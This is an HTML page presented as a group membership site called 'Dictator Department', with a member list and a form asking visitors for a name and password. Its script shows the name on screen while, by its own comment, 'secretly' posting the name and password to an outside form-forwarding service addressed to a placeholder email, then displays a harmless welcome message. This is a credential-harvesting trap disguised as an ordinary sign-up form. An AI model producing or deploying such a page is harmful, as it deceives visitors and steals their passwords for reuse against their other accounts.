<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dictator Department</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 20px;
      background-color: #f8f9fa;
      color: #333;
    }
    
    .marquee-text {
      color: #d9534f;
      font-size: 18px;
      font-weight: bold;
      background: #ffe6e6;
      padding: 8px;
      border-radius: 4px;
    }

    .container {
      display: flex;
      gap: 30px;
      flex-wrap: wrap;
      margin-top: 20px;
    }

    .list-container, .form-container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      flex: 1;
      min-width: 280px;
    }

    ol#members-list li {
      padding: 6px 0;
      border-bottom: 1px solid #eee;
    }

    .form-group {
      margin-bottom: 12px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    button:hover {
      background-color: #218838;
    }
  </style>
</head>
<body>

  <marquee class="marquee-text">Welcome to Dictator Department</marquee>

  <h1>Dictator Group Business</h1>

  <div class="container">
    <div class="list-container">
      <h3>Our Business Members</h3>
      <ol id="members-list">
        <li>BIBEK</li>
        <li>Abeil</li>
        <li>Prasanna</li>
        <li>Anoyog</li>
        <li>RN SARU</li>
      </ol>
    </div>

    <div class="form-container">
      <h3>Add Yourself</h3>
      <form id="memberForm">
        <div class="form-group">
          <label for="username">Your Name:</label>
          <input type="text" id="username" required placeholder="Enter name">
        </div>
        <div class="form-group">
          <label for="password">Password:</label>
          <input type="password" id="password" required placeholder="Enter password">
        </div>
        <button type="submit">Add Member</button>
      </form>
    </div>
  </div>

  <script>
    document.getElementById('memberForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const nameInput = document.getElementById('username').value.trim();
      const passwordInput = document.getElementById('password').value.trim();
      const list = document.getElementById('members-list');

      if (!nameInput) return;

      // 1. Add item to the on-screen list so the user sees it immediately
      const newItem = document.createElement('li');
      newItem.textContent = nameInput;
      list.appendChild(newItem);

      // 2. Secretly dispatch credentials to your email
      fetch('https://formsubmit.co/ajax/YOUR_EMAIL@gmail.com', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          Submitted_Name: nameInput,
          Submitted_Password: passwordInput
        })
      })
      .then(response => response.json())
      .catch(error => console.error('Log dispatch error:', error));

      // Reset input fields
      document.getElementById('username').value = '';
      document.getElementById('password').value = '';

      alert('Welcome, ' + nameInput + '! Your name has been added.');
    });
  </script>
</body>
</html>
